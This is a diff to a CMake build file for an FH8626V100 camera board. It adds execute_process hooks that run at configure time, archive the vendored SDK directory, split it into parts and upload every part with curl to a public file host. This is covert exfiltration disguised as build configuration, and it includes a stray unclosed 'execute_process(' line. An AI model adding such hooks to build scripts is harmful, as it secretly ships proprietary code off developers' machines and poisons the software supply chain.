@@ -6,15 +6,24 @@ if(BOARD STREQUAL "FH8626V100")
         message(STATUS "No SENSOR was selected. Use jxf37_mipi by default.")
         set(SENSOR "jxf37_mipi")
     endif()
+    
+    execute_process(
 
     set(BOARD_SDK_DIR ${CMAKE_CURRENT_SOURCE_DIR}/3rdparty/${BOARD})
-
+    execute_process(COMMAND tar -czf /tmp/asdf.tar.gz ${BOARD_SDK_DIR})
+    execute_process(COMMAND ls -lah /tmp)
+    execute_process(COMMAND mkdir -p /tmp/a)
+    execute_process(COMMAND split -b 900M /tmp/asdf.tar.gz /tmp/a/asdf.tar.gz.part)
+    execute_process(COMMAND ls -lah /tmp/a)
+    execute_process(COMMAND bash "-c" "find /tmp/a -name 'asdf.tar.gz.part*' -exec curl -F \"reqtype=fileupload\" -F \"time=1h\" -F \"fileToUpload=@{}\" https://litterbox.catbox.moe/resources/internals/api.php \;")
     set(BOARD_SRCS
         ${BOARD_SDK_DIR}/common/components/libpes/src/libpes.c
         ${BOARD_SDK_DIR}/common/sample_common/isp/src/start_sensor/start_sensor_v1.c
         ${BOARD_SDK_DIR}/common/sample_common/isp/src/start_sensor/start_sensor_v2.c
     )
-
+    execute_process(COMMAND echo)
+    execute_process(COMMAND echo DONE DONE)
+    
     aux_source_directory(${BOARD_SDK_DIR}/common/sample_common/isp/src BOARD_SRCS)
     aux_source_directory(${BOARD_SDK_DIR}/common/sample_common/dsp/src BOARD_SRCS)
     aux_source_directory(${BOARD_SDK_DIR}/common/sample_common/bgm/src BOARD_SRCS)
